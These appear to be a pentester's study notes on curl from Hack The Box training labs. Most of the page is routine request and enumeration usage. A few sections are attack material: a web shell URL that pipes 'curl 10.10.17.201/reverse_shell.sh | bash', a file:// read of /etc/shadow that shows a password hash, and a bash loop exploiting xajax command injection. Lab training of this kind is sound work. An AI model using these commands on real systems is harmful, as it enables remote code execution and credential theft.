# ⚙️ curl

Tags: #⚙️
Related to:
See also: [[wget]]
Previous: [[Web Requests]], [[JavaScript Deobfuscation]], [[Hacking Wordpress]], [[Getting Started]], [[Footprinting]], [[Information Gathering - Web Edition]]

## Description

Transfer a URL. Short for 'client url'.

## Usage Examples

### Cheatsheets

| **Command** | **Description** |
| --------------|-------------------|
| `curl -h` | cURL help menu |
| `curl inlanefreight.com` | Basic GET request |
| `curl -s -O inlanefreight.com/index.html` | Download file |
| `curl -k https://inlanefreight.com` | Skip HTTPS (SSL) certificate validation |
| `curl inlanefreight.com -v` | Print full HTTP request/response details |
| `curl -I https://www.inlanefreight.com` | Send HEAD request (only prints response headers) |
| `curl -i https://www.inlanefreight.com` | Print response headers and response body |
| `curl https://www.inlanefreight.com -A 'Mozilla/5.0'` | Set User-Agent header |
| `curl -u admin:admin http://<SERVER_IP>:<PORT>/` | Set HTTP basic authorization credentials |
| `curl  http://admin:admin@<SERVER_IP>:<PORT>/` | Pass HTTP basic authorization credentials in the URL |
| `curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://<SERVER_IP>:<PORT>/` | Set request header |
| `curl 'http://<SERVER_IP>:<PORT>/search.php?search=le'` | Pass GET parameters |
| `curl -X POST -d 'username=admin&password=admin' http://<SERVER_IP>:<PORT>/` | Send POST request with POST data |
| `curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://<SERVER_IP>:<PORT>/` | Set request cookies |
| `curl -X POST -d '{"search":"london"}' -H 'Content-Type: application/json' http://<SERVER_IP>:<PORT>/search.php` | Send POST request with JSON data |

#### Passive Subdomain Enumeration

| **Resource/Command** | **Description** |
|-|-|
| `curl -s https://sonar.omnisint.io/subdomains/{domain} \| jq -r '.[]' \| sort -u` | All subdomains for a given domain. |
| `curl -s https://sonar.omnisint.io/tlds/{domain} \| jq -r '.[]' \| sort -u` | All TLDs found for a given domain. |
| `curl -s https://sonar.omnisint.io/all/{domain} \| jq -r '.[]' \| sort -u` | All results across all TLDs for a given domain. |
| `curl -s https://sonar.omnisint.io/reverse/{ip} \| jq -r '.[]' \| sort -u` | Reverse DNS lookup on IP address. |
| `curl -s https://sonar.omnisint.io/reverse/{ip}/{mask} \| jq -r '.[]' \| sort -u` | Reverse DNS lookup of a CIDR range. |
| `curl -s "https://crt.sh/?q=${TARGET}&output=json" \| jq -r '.[] \| "\(.name_value)\n\(.common_name)"' \| sort -u` | Certificate Transparency. |


#### APIs

| **Command** | **Description** |
| --------------|-------------------|
| `curl http://<SERVER_IP>:<PORT>/api.php/city/london` | Read entry |
| `curl -s http://<SERVER_IP>:<PORT>/api.php/city/ \| jq` | Read all entries |
| `curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'` | Create (add) entry |
| `curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'` | Update (modify) entry |
| `curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City` | Delete entry |

## Usage Examples

### Certificate transparency

	curl -s https://crt.sh/\?q\=<target-domain>\&output\=json | jq .

```text
[
  {
    "issuer_ca_id": 183267,
    "issuer_name": "C=US, O=Let's Encrypt, CN=R3",
    "common_name": "inlanefreight.com",
    "name_value": "inlanefreight.com\nwww.inlanefreight.com",
    "id": 8022808792,
    "entry_timestamp": "2022-11-20T17:21:52.454",
    "not_before": "2022-11-20T16:21:51",
    "not_after": "2023-02-18T16:21:50",
    "serial_number": "0429e004d5023c66007d661e3755cd36a640"
  },
  {
    "issuer_ca_id": 183267,
    "issuer_name": "C=US, O=Let's Encrypt, CN=R3",
    "common_name": "inlanefreight.com",
    "name_value": "inlanefreight.com\nwww.inlanefreight.com",
    "id": 8020606706,
    "entry_timestamp": "2022-11-20T17:21:51.62",
    "not_before": "2022-11-20T16:21:51",
    "not_after": "2023-02-18T16:21:50",
    "serial_number": "0429e004d5023c66007d661e3755cd36a640"
  },
<...snip...>
```

	curl -s "https://crt.sh/?q=${TARGET}&output=json" | jq -r '.[] | "\(.name_value)\n\(.common_name)"' | sort -u > "${TARGET}_crt.sh.txt"

```text
account-control.facebook.com----retrieve-info.albayrakyangin.com
*.adtools.facebook.com
adtools.facebook.com
*.ak.facebook.com
ak.facebook.com
<...snip...>
```

### Get Help By man Page Category

```text
 auth        Different types of authentication methods
 connection  Low level networking operations
 curl        The command line tool itself
 dns         General DNS options
 file        FILE protocol options
 ftp         FTP protocol options
 http        HTTP and HTTPS protocol options
 imap        IMAP protocol options
 misc        Options that don't fit into any other category
 output      Filesystem output
 pop3        POP3 protocol options
 post        HTTP Post specific options
 proxy       All options related to proxies
 scp         SCP protocol options
 sftp        SFTP protocol options
 smtp        SMTP protocol options
 ssh         SSH protocol options
 telnet      TELNET protocol options
 tftp        TFTP protocol options
 tls         All TLS/SSL related options
 upload      All options for uploads
 verbose     Options related to any kind of command line output of curl
```

	curl --help ssh

```text
Usage: curl [options...] <url>
ssh: SSH protocol options
     --compressed-ssh Enable SSH compression
     --key <key>      Private key file name
     --pass <phrase>  Pass phrase for the private key
```

### Interact With IMAP

	curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd

```text
* LIST (\HasNoChildren) "." Important
* LIST (\HasNoChildren) "." INBOX
```

	curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v

```text
*   Trying 10.129.14.128:993...
* TCP_NODELAY set
* Connected to 10.129.14.128 (10.129.14.128) port 993 (#0)
* successfully set certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
* Server certificate:
*  subject: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support; CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb
*  start date: Sep 19 19:44:58 2021 GMT
*  expire date: Jul  4 19:44:58 2295 GMT
*  issuer: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support; CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb
*  SSL certificate verify result: self signed certificate (18), continuing anyway.
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* old SSL session ID is stale, removing
< * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB-Academy IMAP4 v.0.21.4
> A001 CAPABILITY
< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN
< A001 OK Pre-login capabilities listed, post-login capabilities have more.
> A002 AUTHENTICATE PLAIN AGNyeTBsMXQzADEyMzQ=
< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE
< A002 OK Logged in
> A003 LIST "" *
< * LIST (\HasNoChildren) "." Important
* LIST (\HasNoChildren) "." Important
< * LIST (\HasNoChildren) "." INBOX
* LIST (\HasNoChildren) "." INBOX
< A003 OK List completed (0.001 + 0.000 secs).
* Connection #0 to host 10.129.14.128 left intact
```

### HTTP Header

	curl -I "http://${TARGET}"

```text
HTTP/1.1 200 OK
Date: Thu, 23 Sep 2021 15:10:42 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.3.5
Link: <http://192.168.10.10/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8
```

	curl -I http://${TARGET}

```text
HTTP/1.1 200 OK
Host: randomtarget.com
Date: Thu, 23 Sep 2021 15:12:21 GMT
Connection: close
X-Powered-By: PHP/7.4.21
Set-Cookie: PHPSESSID=gt02b1pqla35cvmmb2bcli96ml; path=/ 
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-type: text/html; charset=UTF-8
```

### Get Reverse Shell

	http://10.129.171.59/templates/protostar/htb.php?pwn=curl 10.10.17.201/reverse_shell.sh | bash

### Get Local File

	curl file:///etc/shadow

```text
floris:$6$yl7KKyGaOhVExlCb$ONJceChbI7srpLlJ/AhCLgESU7E4gXexPVgsJMjvQ0hP.6fwslfwWmD15cuaYs9./Jin4e/4LURPgEBav4iv//:17673:0:99999:7:::
```

### Send Exploit Through Proxy Using -x Flag to See What It's Doing:

Modify source code to run through proxy:

```bash
#!/bin/bash
URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl -x 'http://127.0.0.1:8080' --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

Here's how the script works:

	curl
	xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E	// payload
	echo \"BEGIN\";${cmd};echo \"END\"	// echo BEGIN and END between the command we run
	sed -n -e '/BEGIN/,/END/ p'			// it send that to sed and grabs everything between BEGIN and END

### Follow Redirects

	curl L https://www.inlanefreight.com

### Authenticate With Cookie and Send POST Request to Retrieve json Data

	curl -X POST -d '{"search":"flag"}' -H 'Cookie: PHPSESSID=6eaubqoi86fevu4knlpi2cg7e3' -H 'Content-Type: application/json' 'http://<IP>:<port>/search.php'

```text
["flag: HTB{...}"]
```

### Format json Responses

#### Get Raw json

	curl http://<SERVER_IP>:<PORT>/api.php/city/london

```text
[{"city_name":"London","country_name":"(UK)"}]
```

#### Get Formatted json

	curl -s http://<SERVER_IP>:<PORT>/api.php/city/london | jq

```text
[
  {
    "city_name": "London",
    "country_name": "(UK)"
  }
]
```

### Get Header Silently

301 Moved Permanently:

	curl -s -I -X GET http://blog.inlanefreight.com/?author=1

```text
HTTP/1.1 301 Moved Permanently
Date: Wed, 13 May 2020 20:47:08 GMT
Server: Apache/2.4.29 (Ubuntu)
X-Redirect-By: WordPress
Location: http://blog.inlanefreight.com/index.php/author/admin/
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

404 Not Found:

	curl -s -I -X GET http://blog.inlanefreight.com/?author=100

```text
HTTP/1.1 404 Not Found
Date: Wed, 13 May 2020 20:47:14 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Link: <http://blog.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
```

### Log In to IMAPS Service

	curl -k 'imaps://<FQDN/IP>' --user <user>:<password>

### Use Custom Header

	curl -s 10.129.156.165 -H "Host: customers.inlanefreight.htb"

```text
<!doctype html>
<head>FLAG No.4:</head>
<body>
        HTB{...}
</body>
```

# References